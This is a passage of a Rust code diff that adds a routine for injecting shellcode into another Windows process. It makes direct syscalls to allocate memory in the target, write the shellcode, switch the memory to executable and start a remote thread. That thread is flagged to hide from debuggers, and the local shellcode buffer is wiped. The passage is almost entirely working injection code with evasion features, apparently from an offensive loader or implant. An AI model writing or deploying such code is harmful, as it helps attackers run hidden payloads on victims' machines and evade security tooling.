+            log::debug!("Error creating process : {:x}", status);
+            return Err(status.to_string().into());
+        }
+
+        RtlFreeHeap(RtlProcessHeap(), 0, attribute_list as *mut c_void);
+        RtlDestroyProcessParameters(process_parameters);
+    }
+
+    let mut base_addr = NULL;
+
+    unsafe {
+        status = syscall!(
+            "NtAllocateVirtualMemory",
+            process_handle,
+            &mut base_addr,
+            0,
+            &mut shellcode.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE
+        );
+    }
+    if !NT_SUCCESS(status) {
+        log::debug!(
+            "Error allocating memory in the target process: {:x}",
+            status
+        );
+        return Err(status.to_string().into());
+    }
+
+    unsafe {
+        status = syscall!(
+            "NtWriteVirtualMemory",
+            process_handle,
+            base_addr,
+            shellcode.as_mut_ptr() as *mut c_void,
+            shellcode.len(),
+            NULL
+        );
+    }
+    if !NT_SUCCESS(status) {
+        log::debug!("Error writing in the target process memory: {:x}", status);
+        return Err(status.to_string().into());
+    }
+
+    unsafe {
+        let mut old_perms = PAGE_READWRITE;
+        status = syscall!(
+            "NtProtectVirtualMemory",
+            process_handle,
+            &mut base_addr,
+            &mut shellcode.len(),
+            PAGE_EXECUTE_READ,
+            &mut old_perms
+        );
+    }
+    if !NT_SUCCESS(status) {
+        log::debug!("Error changing memory permission: {:x}", status);
+        return Err(status.to_string().into());
+    }
+
+    shellcode.clear();
+    shellcode.shrink_to_fit();
+
+    let mut thread_handle: HANDLE = NULL;
+    unsafe {
+        status = syscall!(
+            "NtCreateThreadEx",
+            &mut thread_handle,
+            THREAD_ALL_ACCESS,
+            NULL,
+            process_handle,
+            base_addr,
+            NULL,
+            THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
+            0 as usize,
+            0 as usize,
+            0 as usize,
+            NULL
+        );
+    }
+    if !NT_SUCCESS(status) {
+        log::debug!("Error starting remote thread: {:x}", status);
+        return Err(status.to_string().into());
+    }
+
+    unsafe {
+        status = syscall!(
+            "NtWaitForSingleObject",
+            thread_handle,
+            0,
+            NULL as *mut _ as *mut LARGE_INTEGER
+        );
+        if !NT_SUCCESS(status) {
+            log::debug!("Error waiting for execution: {:x}", status);
+            return Err(status.to_string().into());
         }
     }
+
+    unsafe {
+        status = syscall!("NtClose", process_handle);
+    }
+    if !NT_SUCCESS(status) {
+        log::debug!("Closing failed: {}", status);
+        return Err(status.to_string().into());
+    }
+
     Ok(())
 }
